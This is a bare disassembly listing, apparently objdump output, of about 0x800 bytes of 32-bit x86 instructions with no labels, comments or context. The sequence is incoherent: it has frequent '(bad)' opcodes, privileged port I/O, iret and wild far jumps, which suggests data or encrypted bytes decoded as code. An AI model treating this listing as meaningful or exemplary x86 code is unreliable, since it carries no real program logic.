  402954:	stos   BYTE PTR es:[edi],al
  402955:	push   ds
  402956:	shl    BYTE PTR [edx],cl
  402958:	mov    BYTE PTR [ebx-0x67d2d723],dl
  40295e:	dec    esi
  40295f:	xchg   ecx,eax
  402960:	mov    ecx,0x29585fbd
  402965:	or     dl,BYTE PTR [eax+0x45]
  402968:	xor    bl,ah
  40296a:	ins    DWORD PTR es:[edi],dx
  40296b:	and    edx,DWORD PTR [edi+0xa0bdcf6]
  402971:	mov    fs,WORD PTR [ebx]
  402973:	inc    eax
  402974:	out    dx,al
  402975:	jo     0x4029ea
  402977:	repnz popf 
  402979:	pop    ecx
  40297a:	out    0x68,al
  40297c:	je     0x402927
  40297e:	call   0xd5af6d71
  402983:	in     eax,0xfc
  402985:	adc    eax,0xfc70337f
  40298a:	push   edx
  40298b:	mov    ah,0x4b
  40298d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40298e:	stos   BYTE PTR es:[edi],al
  40298f:	fwait
  402990:	cmc    
  402991:	fst    QWORD PTR [edx]
  402993:	dec    ecx
  402994:	mov    eax,ds:0xf1453b27
  402999:	xchg   esp,eax
  40299a:	cmp    ebp,DWORD PTR [ebx+0x73]
  40299d:	rcr    DWORD PTR [edi-0x1a],0x7f
  4029a1:	inc    esi
  4029a2:	push   edx
  4029a3:	cdq    
  4029a4:	sub    al,BYTE PTR [edx]
  4029a6:	iret   
  4029a7:	jl     0x4029e9
  4029a9:	out    dx,al
  4029aa:	sub    BYTE PTR ds:0x8f7b54a,0xaf
  4029b1:	scas   al,BYTE PTR es:[edi]
  4029b2:	sub    esi,DWORD PTR [ebx+0x34]
  4029b5:	es (bad) 
  4029b7:	xchg   ebp,eax
  4029b8:	lds    ebx,FWORD PTR [edi]
  4029ba:	ror    DWORD PTR [ebx+0x4f],0x66
  4029be:	(bad)  
  4029bf:	cld    
  4029c0:	jae    0x402948
  4029c2:	aas    
  4029c3:	cdq    
  4029c4:	inc    esi
  4029c5:	das    
  4029c6:	xor    ebx,esp
  4029c8:	loopne 0x4029d6
  4029ca:	pop    esp
  4029cb:	push   ss
  4029cc:	xchg   ebx,eax
  4029cd:	cmp    DWORD PTR [ebp-0x27b79ca0],esp
  4029d3:	(bad)  
  4029d4:	test   bl,0x2f
  4029d7:	shl    esp,1
  4029d9:	push   esi
  4029da:	xchg   esi,eax
  4029db:	cmp    DWORD PTR [ecx+eiz*2],ebp
  4029de:	mov    eax,ds:0xd2b5cf53
  4029e3:	xchg   ebx,eax
  4029e4:	cwde   
  4029e5:	out    dx,al
  4029e6:	(bad)  
  4029e8:	push   esp
  4029e9:	scas   al,BYTE PTR es:[edi]
  4029ea:	scas   al,BYTE PTR es:[edi]
  4029eb:	or     eax,0x376fd0a8
  4029f0:	mov    ecx,DWORD PTR [ebx]
  4029f2:	popf   
  4029f3:	in     al,dx
  4029f4:	mov    eax,0xe6e1acd1
  4029f9:	mov    ds:0x5a38561,eax
  4029fe:	enter  0xdb62,0x84
  402a02:	xchg   ebx,eax
  402a03:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402a04:	mov    edi,0x7ca0d567
  402a09:	jl     0x40299d
  402a0b:	xchg   ebp,eax
  402a0c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402a0d:	or     BYTE PTR [ecx],bh
  402a0f:	imul   eax,DWORD PTR [esi-0x51],0xfffffff1
  402a13:	ss and eax,0xe905a6b3
  402a19:	jmp    0x402a3f
  402a1b:	arpl   di,dx
  402a1d:	test   al,0xeb
  402a1f:	mov    cl,0xa8
  402a21:	jmp    0x6f2661e3
  402a26:	jae    0x402a99
  402a28:	das    
  402a29:	push   ss
  402a2a:	inc    edi
  402a2b:	in     al,0xb1
  402a2d:	xchg   DWORD PTR [ebx],ecx
  402a2f:	sbb    DWORD PTR [ebx+0x3183cf01],ebx
  402a35:	fadd   DWORD PTR [ebx-0x6a]
  402a38:	fs push ebp
  402a3a:	das    
  402a3b:	(bad)  
  402a3c:	ja     0x4029bf
  402a3e:	sbb    DWORD PTR [eax-0x4294f304],esp
  402a44:	xchg   esp,eax
  402a45:	push   es
  402a46:	cmc    
  402a47:	inc    eax
  402a48:	sbb    dh,bl
  402a4a:	cmp    BYTE PTR [ebp+0x2fe04b9c],bl
  402a50:	imul   edx,DWORD PTR [edx-0x258b45bc],0x132dba14
  402a5a:	mov    dl,0x17
  402a5c:	loopne 0x402a49
  402a5e:	icebp  
  402a5f:	loop   0x402a42
  402a61:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402a62:	or     edx,ebx
  402a64:	xchg   BYTE PTR [ebp-0x33757239],cl
  402a6a:	xor    BYTE PTR [edi-0x64d4f3de],0xc6
  402a71:	repz and esi,esi
  402a74:	add    BYTE PTR [ebx+0x56],cl
  402a77:	out    0xf5,al
  402a79:	or     ecx,DWORD PTR [edi+eax*4-0x567facf]
  402a80:	mov    bh,0xc8
  402a82:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402a83:	dec    edx
  402a84:	mov    edi,0xb41f6a9d
  402a89:	retf   0xa493
  402a8c:	push   esp
  402a8d:	mov    ds:0x4c1e2256,al
  402a92:	sub    eax,0x26623d31
  402a97:	jo     0x402a4c
  402a99:	fdiv   DWORD PTR [eax+0x4e]
  402a9c:	test   al,0x84
  402a9e:	push   ebx
  402a9f:	fisubr WORD PTR [ebp+0x110ebda7]
  402aa5:	das    
  402aa6:	shl    DWORD PTR fs:[edx-0x51e48e53],cl
  402aad:	xchg   esi,eax
  402aae:	dec    ecx
  402aaf:	lea    esi,ds:0x28a9dfc0
  402ab5:	fwait
  402ab6:	es sub eax,0xa3b33f5e
  402abc:	xor    al,0x82
  402abe:	sbb    BYTE PTR [edi-0x71],dh
  402ac1:	in     al,dx
  402ac2:	mov    ebp,0xaf87c2b5
  402ac7:	add    al,BYTE PTR [esi]
  402ac9:	xor    DWORD PTR [eax-0x15],edx
  402acc:	popaw  
  402ace:	push   cs
  402acf:	pop    esp
  402ad0:	retf   0x9831
  402ad3:	(bad)  
  402ad4:	mov    eax,0x6025cab6
  402ad9:	stos   DWORD PTR es:[edi],eax
  402ada:	mov    al,0x6f
  402adc:	(bad)  
  402add:	pop    ebp
  402ade:	mov    eax,DWORD PTR [esi]
  402ae0:	stc    
  402ae1:	mov    ah,0xd5
  402ae3:	into   
  402ae4:	adc    DWORD PTR [esi+0x23],eax
  402ae7:	or     DWORD PTR [esp+edi*8],ecx
  402aea:	ins    DWORD PTR es:[edi],dx
  402aeb:	adc    eax,0x1809f96f
  402af0:	clc    
  402af1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402af2:	call   0xf5b8:0x739161de
  402af9:	push   edi
  402afa:	stos   BYTE PTR es:[edi],al
  402afb:	push   ds
  402afc:	lock aam 0x20
  402aff:	mov    BYTE PTR [ebx+0x35],dh
  402b02:	(bad)  
  402b03:	xor    edi,DWORD PTR gs:[ebx+ecx*2]
  402b07:	mov    ebx,0x4e980fca
  402b0c:	pop    DWORD PTR [esi]
  402b0e:	sbb    cl,dh
  402b10:	jns    0x402abc
  402b12:	cmp    eax,0xf98570c
  402b17:	cmp    ecx,DWORD PTR [eax-0x544d80c8]
  402b1d:	jle    0x402b54
  402b1f:	fwait
  402b20:	push   ebp
  402b21:	mov    DWORD PTR [eax+0x6bc9eb5],edx
  402b27:	push   ds
  402b28:	fs mov dl,0x8b
  402b2b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402b2c:	clc    
  402b2d:	lods   al,BYTE PTR ds:[esi]
  402b2e:	leave  
  402b2f:	add    dl,BYTE PTR [ecx+eax*4]
  402b32:	aam    0xdd
  402b34:	or     DWORD PTR [edi],0xffffffaf
  402b37:	aaa    
  402b38:	in     eax,dx
  402b39:	cmp    DWORD PTR [ebx+0x5b89c53e],esp
  402b3f:	sub    bl,BYTE PTR [esi+0x16d21e3e]
  402b45:	inc    ebx
  402b46:	push   ebp
  402b47:	ds ss clc 
  402b4a:	outs   dx,BYTE PTR ds:[esi]
  402b4b:	je     0x402b22
  402b4d:	in     eax,dx
  402b4e:	dec    ebp
  402b4f:	dec    edx
  402b50:	out    dx,al
  402b51:	push   eax
  402b52:	mov    esi,0x3b79f990
  402b57:	mov    ds:0xdb48d85c,eax
  402b5c:	pop    edx
  402b5d:	jne    0x402bae
  402b5f:	cmp    al,0x79
  402b61:	test   BYTE PTR [esi+0xc],dh
  402b64:	dec    ecx
  402b65:	gs dec ebp
  402b67:	add    al,0xc1
  402b69:	test   DWORD PTR ds:[ebp-0x44b076c7],0xb6ee61fc
  402b74:	or     eax,0x7800cb89
  402b79:	mov    es,WORD PTR [ecx+0x4f7eb420]
  402b7f:	mov    edi,0xce918105
  402b84:	jae    0x402b30
  402b86:	dec    ebp
  402b87:	arpl   WORD PTR [ecx],bx
  402b89:	xchg   ecx,eax
  402b8a:	dec    edi
  402b8b:	push   0xffffffaf
  402b8d:	add    ebp,DWORD PTR [ebx]
  402b8f:	push   0xffffffdf
  402b91:	adc    eax,0xa6f41862
  402b96:	dec    esi
  402b97:	or     DWORD PTR [esi+0x4a3d3047],ecx
  402b9d:	div    esi
  402b9f:	adc    eax,0xd8799ef8
  402ba4:	call   bp
  402ba7:	pop    edi
  402ba8:	pop    esp
  402ba9:	mov    esi,0x4b71f8c4
  402bae:	xor    eax,0x969bd9fd
  402bb3:	dec    esi
  402bb4:	imul   edi,DWORD PTR ds:0xf02c392c,0x7d4e7fd3
  402bbe:	cmp    edi,0xffffffb5
  402bc1:	dec    ecx
  402bc2:	dec    eax
  402bc3:	cld    
  402bc4:	and    eax,0x1243d9b3
  402bc9:	xor    eax,0xd99c28eb
  402bce:	mov    ebx,0x732e4128
  402bd3:	cmp    BYTE PTR [ebp+0x51d9c395],ch
  402bd9:	sub    eax,DWORD PTR [edi]
  402bdb:	retf   0x7971
  402bde:	xchg   al,al
  402be0:	popf   
  402be1:	test   BYTE PTR [edx],ah
  402be3:	mov    ds:0x38cdf59b,eax
  402be8:	sbb    al,0xdb
  402bea:	pushf  
  402beb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402bec:	nop
  402bed:	dec    edi
  402bee:	inc    ecx
  402bef:	mov    cl,0x3a
  402bf1:	inc    esp
  402bf2:	pop    ebx
  402bf3:	idiv   DWORD PTR [esi]
  402bf5:	test   BYTE PTR [ebp-0xf],0xfd
  402bf9:	mov    DWORD PTR [ecx],0x2d09bc87
  402bff:	pop    ss
  402c00:	daa    
  402c01:	dec    eax
  402c02:	xchg   BYTE PTR [esi+0x52],ah
  402c05:	pop    es
  402c06:	xchg   ebp,eax
  402c07:	push   ebx
  402c08:	inc    esi
  402c09:	sbb    DWORD PTR [ecx+eax*1],ecx
  402c0c:	push   ecx
  402c0d:	leave  
  402c0e:	pop    esp
  402c0f:	sub    eax,0x167d0f57
  402c14:	or     BYTE PTR [ecx],dh
  402c16:	jno    0x402c8b
  402c18:	adc    bl,BYTE PTR [esi+0x6274be71]
  402c1e:	or     al,0xe3
  402c20:	in     al,0x70
  402c22:	in     eax,dx
  402c23:	dec    ecx
  402c24:	fldcw  WORD PTR [ecx+esi*1]
  402c27:	nop
  402c28:	and    bh,0x89
  402c2b:	jne    0x402c74
  402c2d:	push   ebx
  402c2e:	(bad)  
  402c2f:	rol    BYTE PTR [eax+0x35],0x51
  402c33:	xor    bh,0xdb
  402c36:	fwait
  402c37:	lds    ecx,FWORD PTR [edx+0x3586ec9]
  402c3d:	add    eax,0x3688cf91
  402c42:	outs   dx,DWORD PTR ds:[esi]
  402c43:	out    0x96,eax
  402c45:	ror    DWORD PTR [eax-0x53b416b2],1
  402c4b:	jecxz  0x402cc7
  402c4d:	mov    al,0xe3
  402c4f:	js     0x402bec
  402c51:	mov    bl,0xef
  402c53:	jae    0x402c22
  402c55:	inc    ebp
  402c56:	cmp    DWORD PTR [eax-0x37a775],edi
  402c5c:	push   edx
  402c5d:	jl     0x402c4f
  402c5f:	push   cs
  402c60:	nop
  402c61:	dec    ecx
  402c62:	jbe    0x402cd3
  402c64:	pmaxub mm3,QWORD PTR [eax-0x54b68322]
  402c6b:	scas   al,BYTE PTR es:[edi]
  402c6c:	mov    al,0xe1
  402c6e:	js     0x402c90
  402c70:	callw  0x593f
  402c74:	repz iret 
  402c76:	les    edi,FWORD PTR [ebx]
  402c78:	popa   
  402c79:	mov    ecx,0x9e7cad0b
  402c7e:	xchg   ebp,eax
  402c7f:	xlat   BYTE PTR ds:[ebx]
  402c80:	hlt    
  402c81:	adc    eax,0xf1c4c25d
  402c86:	xchg   ah,ch
  402c88:	and    BYTE PTR [esi+0x2fb98f23],ah
  402c8e:	jp     0x402cbd
  402c90:	xchg   esp,eax
  402c91:	inc    edi
  402c92:	ret    0x1cf9
  402c95:	push   edx
  402c96:	dec    esp
  402c97:	es mov dl,0x90
  402c9a:	stc    
  402c9b:	test   BYTE PTR [esp+ebx*1-0x52],bh
  402c9f:	mov    ds:0xca9496db,al
  402ca4:	ds in  eax,dx
  402ca6:	jo     0x402c6d
  402ca8:	aad    0xac
  402caa:	mov    ah,0x61
  402cac:	or     BYTE PTR [ebx-0x33],bl
  402caf:	xchg   esp,eax
  402cb0:	sbb    ebx,DWORD PTR [edx+ebp*1]
  402cb3:	fs sbb al,0x20
  402cb6:	adc    bh,BYTE PTR [ecx]
  402cb8:	add    al,0x3e
  402cba:	sub    BYTE PTR [edx+0x18e41621],dl
  402cc0:	loop   0x402ced
  402cc2:	pop    ebx
  402cc3:	loopne 0x402d00
  402cc5:	or     al,0x23
  402cc7:	or     ecx,DWORD PTR [edi+edi*1+0x5943b3]
  402cce:	push   esp
  402ccf:	loope  0x402d07
  402cd1:	pop    ss
  402cd2:	or     BYTE PTR [ecx],bh
  402cd4:	fdivr  DWORD PTR [eax+0x19]
  402cd7:	fiadd  DWORD PTR [ebp+0x39]
  402cda:	dec    ebp
  402cdb:	sbb    dl,bh
  402cdd:	cmp    eax,0x746bb435
  402ce2:	dec    ecx
  402ce3:	xor    BYTE PTR [eax],bl
  402ce5:	das    
  402ce6:	push   ebx
  402ce7:	ins    BYTE PTR es:[edi],dx
  402ce8:	shl    DWORD PTR [esi-0x15],cl
  402ceb:	outs   dx,BYTE PTR ds:[esi]
  402cec:	or     BYTE PTR [ebx+esi*2],dl
  402cef:	push   edi
  402cf0:	sbb    dl,BYTE PTR [edi+eax*4-0x6d]
  402cf4:	xor    DWORD PTR [edi],edi
  402cf6:	xor    eax,esi
  402cf8:	sub    eax,0x1a4a99e0
  402cfd:	leave  
  402cfe:	shl    DWORD PTR [ecx],cl
  402d00:	imul   ebp,ecx,0xc6aed0e2
  402d06:	mov    ds:0x8a67a6c8,eax
  402d0b:	fisttp QWORD PTR [ebp-0x1104d395]
  402d11:	out    0xf9,al
  402d13:	dec    ebp
  402d14:	add    eax,0x43631f4e
  402d19:	test   ecx,0x887f3aa8
  402d1f:	out    0x2d,al
  402d21:	dec    edi
  402d22:	fstp   TBYTE PTR [edx-0x39129134]
  402d28:	scas   eax,DWORD PTR es:[edi]
  402d29:	xchg   edi,eax
  402d2a:	stc    
  402d2b:	mov    DWORD PTR [eax],ecx
  402d2d:	adc    eax,0x6b59a99c
  402d32:	push   es
  402d33:	adc    bl,BYTE PTR [edx]
  402d35:	mov    ds:0xb864adc8,eax
  402d3a:	fwait
  402d3b:	lods   eax,DWORD PTR ds:[esi]
  402d3c:	mov    al,0x66
  402d3f:	jns    0x402d0a
  402d41:	mov    edi,0x25efc8d0
  402d46:	inc    esi
  402d47:	test   bh,0xb0
  402d4a:	fistp  QWORD PTR [ebx]
  402d4c:	imul   esp,DWORD PTR [edi-0x78b76675],0xfe64e541
  402d56:	pop    ebx
  402d57:	sbb    BYTE PTR [esp+eiz*4+0x2c83ea0c],dl
  402d5e:	pushf  
  402d5f:	or     eax,0xd7a3acbd
  402d64:	ror    DWORD PTR [ebp-0xd5eb9f1],0x5e
  402d6b:	fs js  0x402d8b
  402d6e:	idiv   DWORD PTR [ebp+0x38c60f0b]
  402d74:	add    cl,BYTE PTR [eax+0x2d672467]
  402d7a:	aam    0xfa
  402d7c:	(bad)  
  402d7d:	call   0x743e:0x4618b520
  402d84:	ins    BYTE PTR es:[edi],dx
  402d85:	add    al,0xe
  402d87:	mov    ds:0x9ca87190,eax
  402d8c:	jmp    0x402d86
  402d8e:	test   DWORD PTR [edi-0x37974b15],edi
  402d94:	adc    eax,0x1a5aa4d8
  402d99:	nop
  402d9a:	jae    0x402d9a
  402d9c:	fidivr WORD PTR [ecx+0x2a633830]
  402da2:	inc    cl
  402da4:	mov    BYTE PTR [ecx+0x39],al
  402da7:	push   ds
  402da8:	dec    esi
  402da9:	lahf   
  402daa:	popa   
  402dab:	sbb    al,0xf8
  402dad:	cmp    ah,bl
  402daf:	in     eax,dx
  402db0:	sbb    eax,ebp
  402db2:	xor    eax,DWORD PTR [esi]
  402db4:	jle    0x402dbc
  402db6:	inc    ebp
  402db7:	inc    ebx
  402db8:	ss je  0x402e2b
  402dbb:	ss popf 
  402dbd:	mov    ds:0xcd686f67,eax
  402dc2:	into   
  402dc3:	cmp    esp,DWORD PTR [eax-0x6c4f19ec]
  402dc9:	jecxz  0x402e3e
  402dcb:	jbe    0x402e2a
  402dcd:	inc    esi
  402dce:	clc    
  402dcf:	ja     0x402e0b
  402dd1:	lock xor al,0x67
  402dd4:	cli    
  402dd5:	jmp    0x402e47
  402dd7:	adc    BYTE PTR [ebp-0x4baaf301],dh
  402ddd:	mov    ch,0xa
  402ddf:	inc    eax
  402de0:	mov    ds:0xc5a42ea9,al
  402de5:	mov    al,BYTE PTR [ebx+ecx*4]
  402de8:	repz in al,0x68
  402deb:	xlat   BYTE PTR ds:[ebx]
  402dec:	mov    al,0xfc
  402dee:	das    
  402def:	and    eax,0xf6c71254
  402df4:	mov    dl,BYTE PTR [eax]
  402df6:	jns    0x402e75
  402df8:	sti    
  402df9:	lea    esi,[ecx]
  402dfb:	je     0x402dda
  402dfd:	dec    edx
  402dfe:	mov    fs,WORD PTR [edx]
  402e00:	jecxz  0x402e12
  402e02:	adc    ecx,edx
  402e04:	jmp    0xbb8d:0x2c3e3b8b
  402e0b:	dec    ebx
  402e0c:	aad    0x40
  402e0e:	ficom  DWORD PTR [eax+0x7ed881f8]
  402e14:	mov    edi,0xefa06f0c
  402e19:	mov    ch,0xe
  402e1b:	(bad)  
  402e1e:	(bad)  
  402e1f:	aad    0x2
  402e21:	and    al,0x26
  402e23:	inc    ebp
  402e24:	retf   
  402e25:	jbe    0x402ea0
  402e27:	sub    ebx,DWORD PTR [ebp-0x6f4699aa]
  402e2d:	mov    cl,0x5
  402e2f:	(bad)  
  402e30:	xchg   edx,eax
  402e31:	xor    BYTE PTR [ecx+0x35db7e7a],0x82
  402e38:	inc    edx
  402e39:	ss jge 0x402e29
  402e3c:	into   
  402e3d:	sbb    ah,BYTE PTR [edx-0x5a05cfd1]
  402e43:	shl    DWORD PTR [ebx],0xb1
  402e46:	ss mov bh,0x40
  402e49:	jmp    FWORD PTR [ecx-0x75]
  402e4c:	adc    esi,DWORD PTR [ebx]
  402e4e:	bound  ebx,QWORD PTR [edx+0x77]
  402e51:	mov    al,ds:0x91eee46c
  402e56:	rol    BYTE PTR [eax+0x3654f16b],1
  402e5c:	scas   eax,DWORD PTR es:[edi]
  402e5d:	in     al,0xad
  402e5f:	popf   
  402e60:	icebp  
  402e61:	out    dx,eax
  402e62:	fs pusha 
  402e64:	add    al,0xfb
  402e66:	(bad)  
  402e67:	fsub   QWORD PTR [ebx-0x149c28a3]
  402e6d:	std    
  402e6e:	les    edx,FWORD PTR [edx+0x267d71a3]
  402e74:	push   esp
  402e75:	cmp    eax,0x91095e7e
  402e7a:	sbb    BYTE PTR [esi-0x6ec6fd5e],ch
  402e80:	sbb    al,al
  402e82:	mov    DWORD PTR [esi+eax*8+0x4ff31eb4],ebp
  402e89:	push   ecx
  402e8a:	mov    dh,0x87
  402e8c:	mov    eax,0xcf8b285a
  402e91:	sar    BYTE PTR ds:0x75505841,1
  402e97:	inc    edi
  402e98:	not    BYTE PTR [esi+0x59b2af47]
  402e9e:	mul    DWORD PTR [edx+0x3ced9c9d]
  402ea4:	or     al,0x30
  402ea6:	sbb    DWORD PTR [ecx],edx
  402ea8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402ea9:	fld    TBYTE PTR [ebp-0x5726bc8a]
  402eaf:	pop    ecx
  402eb0:	test   edx,esi
  402eb2:	out    dx,eax
  402eb3:	popf   
  402eb4:	add    ecx,DWORD PTR [edx+0x60]
  402eb7:	inc    eax
  402eb8:	inc    esi
  402eb9:	or     eax,0x36926ae1
  402ebe:	dec    ebx
  402ebf:	xchg   DWORD PTR [ebp+0x58dfd8ea],esp
  402ec5:	les    ebp,FWORD PTR [edi+0x52b78b5e]
  402ecb:	jg     0x402e8a
  402ecd:	xchg   edx,eax
  402ece:	and    esp,ebx
  402ed0:	mov    ecx,0x1e1c3656
  402ed5:	fxam   
  402ed7:	push   cs
  402ed8:	and    BYTE PTR ds:0xa3a2ec5f,ch
  402ede:	and    al,0x8a
  402ee0:	pop    ecx
  402ee1:	fimul  DWORD PTR [ebx-0x9582cbd]
  402ee7:	ins    DWORD PTR es:[edi],dx
  402ee8:	pop    ecx
  402ee9:	mov    bh,0x8c
  402eeb:	iret   
  402eec:	adc    BYTE PTR [edi+0x4b42cafb],ch
  402ef2:	mov    BYTE PTR [ebp+eax*4-0x4303e06d],bh
  402ef9:	sbb    eax,0xbdacc0b0
  402efe:	(bad)  
  402eff:	stc    
  402f00:	or     DWORD PTR [ebx],ecx
  402f02:	or     eax,0x9183d2d3
  402f07:	xchg   ecx,eax
  402f08:	fisttp WORD PTR [esi+edi*4-0x57]
  402f0c:	(bad)  
  402f0d:	cmp    BYTE PTR [ecx-0x61d94375],ch
  402f13:	test   DWORD PTR [esi+eiz*4-0x2927f81d],0x191f70a7
  402f1e:	into   
  402f1f:	out    0x28,eax
  402f21:	dec    esi
  402f22:	dec    esp
  402f23:	ins    BYTE PTR es:[edi],dx
  402f24:	sbb    esi,edx
  402f26:	nop
  402f27:	jecxz  0x402fa6
  402f29:	sbb    BYTE PTR [ecx-0x6],dl
  402f2c:	(bad)  
  402f2d:	pop    ebp
  402f2e:	in     al,0xb0
  402f30:	cmp    ch,al
  402f32:	mov    eax,ds:0x1594e50d
  402f37:	push   ss
  402f38:	shl    ebx,0x47
  402f3b:	inc    ebx
  402f3c:	or     BYTE PTR [eax],ah
  402f3e:	lock (bad) 
  402f41:	mov    edi,0x482426b6
  402f46:	or     eax,0xd4589ac4
  402f4b:	icebp  
  402f4c:	call   0x5f6336e2
  402f51:	sub    ebp,0xffffffbc
  402f54:	(bad)  
  402f55:	mov    ch,0x1f
  402f57:	dec    edx
  402f58:	call   0x368de578
  402f5d:	jo     0x402f84
  402f5f:	int    0x12
  402f61:	mov    WORD PTR [edi],?
  402f63:	sub    al,dl
  402f65:	in     al,dx
  402f66:	mov    cl,0x3a
  402f68:	pop    ebp
  402f69:	mov    al,0x89
  402f6b:	pop    eax
  402f6c:	cmp    eax,0x87c88aee
  402f71:	pop    ebp
  402f72:	out    0xfb,al
  402f74:	mov    dl,ch
  402f76:	test   al,0x92
  402f78:	dec    DWORD PTR [eax+0x68]
  402f7b:	outs   dx,BYTE PTR ds:[esi]
  402f7c:	popa   
  402f7d:	shl    bl,cl
  402f7f:	imul   ecx,DWORD PTR [ebx-0x6a9f4410],0xfffffff1
  402f86:	add    BYTE PTR [eax-0x53],ah
  402f89:	adc    BYTE PTR [esi+eax*1+0x70f49fcb],dl
  402f90:	test   BYTE PTR [ebx-0x7445261d],ah
  402f96:	add    BYTE PTR [edi-0x17],bl
  402f99:	imul   edi,ebp,0x721f287d
  402f9f:	repz xchg ebx,eax
  402fa1:	push   edi
  402fa2:	mov    ecx,0x34db8533
  402fa7:	dec    DWORD PTR [ebx]
  402fa9:	std    
  402faa:	fwait
  402fab:	jb     0x402f60
  402fad:	stos   DWORD PTR es:[edi],eax
  402fae:	bound  esp,QWORD PTR [edx+0x75]
  402fb1:	hlt    
  402fb2:	or     bh,BYTE PTR [eax-0x6f]
  402fb5:	push   edx
  402fb6:	ud1    eax,DWORD PTR ds:0x2e01e557
  402fbd:	in     al,0x57
  402fbf:	push   0xc14835b9
  402fc4:	add    eax,0xc4ac1aa9
  402fc9:	cs out dx,al
  402fcb:	push   ss
  402fcc:	es out dx,al
  402fce:	xlat   BYTE PTR ds:[ebx]
  402fcf:	call   0x83e2:0x347b3597
  402fd6:	(bad)  
  402fd7:	fld    st(4)
  402fd9:	ins    DWORD PTR es:[edi],dx
  402fda:	ror    BYTE PTR [edi+0x2deec03a],1
  402fe0:	mov    dh,BYTE PTR [ebx]
  402fe2:	push   ebp
  402fe3:	outs   dx,DWORD PTR ds:[esi]
  402fe4:	(bad)  
  402fe5:	mov    ch,0xba
  402fe7:	push   esi
  402fe8:	ja     0x402f8d
  402fea:	fisttp DWORD PTR [edx-0x330a06c6]
  402ff0:	or     eax,0x9c6fc399
  402ff5:	sbb    esi,DWORD PTR [ebx-0x43e718d9]
  402ffb:	dec    ebp
  402ffc:	mov    ?,WORD PTR [edx+0x22]
  402fff:	xor    DWORD PTR cs:0x3937f0a4,ecx
  403006:	adc    eax,0xb8cc5a9a
  40300b:	mov    DWORD PTR [ebp-0x12d341d3],eax
  403011:	fiadd  WORD PTR [edi+ebx*4-0x19]
  403015:	ins    DWORD PTR es:[edi],dx
  403016:	or     al,BYTE PTR [ecx-0x1f]
  403019:	mov    edi,0x1b88e2df
  40301e:	shl    DWORD PTR [ecx-0x32],1
  403021:	lock and eax,0x2a8e16e2
  403027:	inc    eax
  403028:	and    al,0x6f
  40302a:	js     0x402fbe
  40302c:	lods   al,BYTE PTR ds:[esi]
  40302d:	mov    edi,DWORD PTR [ecx*8+0x3f82783b]
  403034:	mov    edi,ecx
  403036:	ror    esi,0xc8
  403039:	scas   al,BYTE PTR es:[edi]
  40303a:	pop    edx
  40303b:	loop   0x403039
  40303d:	push   eax
  40303e:	popa   
  40303f:	dec    esi
  403040:	mov    esi,0x37d0357d
  403045:	sti    
  403046:	and    cl,dh
  403048:	mov    WORD PTR ds:0xd90b794a,cs
  40304e:	xchg   edi,eax
  40304f:	lahf   
  403050:	mov    ebp,0x4d4fbf5c
  403055:	popf   
  403056:	bnd call 0xff580dcc
  40305c:	je     0x40309a
  40305e:	bound  ebp,QWORD PTR [eax+0x21]
  403061:	adc    dl,dh
  403063:	std    
  403064:	mov    WORD PTR [edi-0x60],cs
  403067:	cmp    dl,0xea
  40306a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40306b:	out    0x35,al
  40306d:	xchg   esi,eax
  40306e:	adc    bl,BYTE PTR [eax-0x5b1dc817]
  403074:	ds pop ss
  403076:	add    al,0x4
  403078:	add    eax,0xe2ea9f89
  40307d:	xchg   ebx,eax
  40307e:	mov    BYTE PTR cs:[eiz*4+0x785ba050],0x81
  403087:	inc    esi
  403088:	xlat   BYTE PTR ds:[ebx]
  403089:	mov    al,BYTE PTR [eax+0x4c47f6f9]
  40308f:	call   0x2b52:0xff08b7df
  403096:	push   edx
  403097:	mov    cl,0x15
  403099:	jp     0x4030b2
  40309b:	cmc    
  40309c:	stc    
  40309d:	out    dx,eax
  40309e:	pop    esp
  40309f:	out    dx,al
  4030a0:	mov    ?,ebx
  4030a2:	xchg   DWORD PTR [ebx-0x3f7686fd],ebp
  4030a8:	lods   al,BYTE PTR ds:[esi]
  4030a9:	pop    esi
  4030aa:	outs   dx,BYTE PTR ds:[esi]
  4030ab:	addr16 mov dh,0x9
  4030ae:	or     al,0xf8
  4030b0:	jo     0x40311a
  4030b2:	scas   eax,DWORD PTR es:[edi]
  4030b3:	icebp  
  4030b4:	out    dx,eax
  4030b5:	lock xor eax,0x635a55bd
  4030bb:	inc    edx
  4030bc:	dec    edi
  4030bd:	ficom  DWORD PTR [ebp+0x52dec1c4]
  4030c3:	stos   DWORD PTR es:[edi],eax
  4030c4:	shl    DWORD PTR [edx],0x1f
  4030c7:	retf   0x9301
  4030ca:	xlat   BYTE PTR ds:[ebx]
  4030cb:	pusha  
  4030cc:	repnz xchg ebx,eax
  4030ce:	xchg   ecx,ecx
  4030d0:	xor    al,0xef
  4030d2:	test   BYTE PTR [edi-0x18],bh
  4030d5:	bound  esi,QWORD PTR [ecx+0x26]
  4030d8:	neg    DWORD PTR ds:0x5bce328a
  4030de:	nop
  4030df:	mov    ah,0xde
  4030e1:	mov    bl,0x21
  4030e3:	cmp    DWORD PTR [edx-0x3d],edi
  4030e6:	dec    esi
  4030e7:	sbb    DWORD PTR [ecx+0x67],0x36
  4030eb:	sbb    bl,BYTE PTR ds:0xb07606e7
  4030f1:	adc    BYTE PTR [edx+0x3b],ch
  4030f4:	mov    bh,0x39
  4030f6:	mov    ds:0x6be05abe,eax
  4030fb:	aam    0x68
  4030fd:	dec    DWORD PTR [esp+ebx*1+0x66]
  403101:	xor    ebp,DWORD PTR [eax]
  403103:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403104:	nop
  403105:	popf   
  403106:	mov    ah,0x5c
  403108:	pop    ebx
  403109:	out    dx,al
  40310a:	jmp    0x40313b
  40310c:	cmp    DWORD PTR [ecx*1-0x34e88a54],edx
  403113:	jecxz  0x4030ef
  403115:	(bad)  
  403117:	jp     0x403141
  403119:	pop    esp
  40311a:	inc    esi
  40311b:	fmul   QWORD PTR [esi]
  40311d:	inc    ebx
  40311e:	jns    0x403183
  403120:	push   eax
  403121:	inc    ebx
  403122:	adc    eax,0xe2299fbf
  403127:	fs dec ebx
